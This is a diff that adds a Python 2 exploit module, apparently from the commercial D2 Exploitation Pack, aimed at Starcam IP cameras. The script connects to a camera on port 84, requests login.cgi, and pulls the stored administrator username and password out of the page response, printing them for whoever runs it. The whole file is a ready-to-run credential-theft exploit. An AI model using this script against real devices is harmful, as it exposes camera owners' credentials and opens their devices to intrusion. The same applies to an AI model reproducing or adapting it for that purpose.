@@ -1,0 +1,58 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2018
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import socket
+
+_name_   = 'd2sec_starcam_1'
+_vendor_ = 'starcam'
+_model_  = ['IP Camera']
+_vuln_   = 'Credentials Disclosure Vulnerability'
+_cve_    = ''
+_ref_    = 'https://blogs.securiteam.com/index.php/archives/3043'
+_port_   = 84
+
+def pwnrouter(host,port=_port_):
+  try:
+    response = ''
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, port))            
+    data = 'GET login.cgi HTTP/1.1\nHost: %s:%d\nUser-Agent: Mozilla/5.0 Gecko/20100101 Firefox/58.0\n\n'%(host,port)
+    s.send(data)    
+    while 1:
+      buff = s.recv(1024)
+      if not buff:
+        break
+      response = response + buff
+    s.close()
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+    print response
+  if 'var loginuser=' in response:
+    print '[+] %s vulnerable\n' % host
+    m = re.search('loginuser="(.+?)".*?loginpass="(.+?)"', response, re.DOTALL)
+    if m is None:
+      print '[+] Credentials not found'
+      print response        
+    else:                  
+      print 'Login: %s\nPassword: %s\n'%(m.group(1),m.group(2))
+      print '===\n\n%s'%response
+  else:            
+    print '[+] %s not vulnerable' % host
+    print response
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
